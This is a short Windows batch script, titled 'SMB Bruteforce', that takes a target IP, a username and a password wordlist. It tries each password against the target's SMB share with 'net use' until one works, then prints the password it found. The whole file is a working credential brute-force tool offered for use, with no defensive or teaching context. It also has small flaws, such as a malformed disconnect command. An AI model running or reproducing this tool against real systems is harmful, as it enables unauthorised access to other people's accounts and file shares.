@echo off
title SMB Bruteforce - by GodDrgn
color 4

:start
echo.
echo Type 'help' for help
echo.
set /p ip="Enter IP Adress: "

set /p user="Enter Username: "

set /p wordlist="Enter Password List: "


set /a count=1
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
cls
color 4
echo Pasword not Found :(
pause
exit


:success
cls
color A
echo.
echo Password Found! %pass%
net use \\%ip% /d /y %pass% >nul 2>&1
pause
exit


:attempt
echo.
echo.
echo Trying...
echo.
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

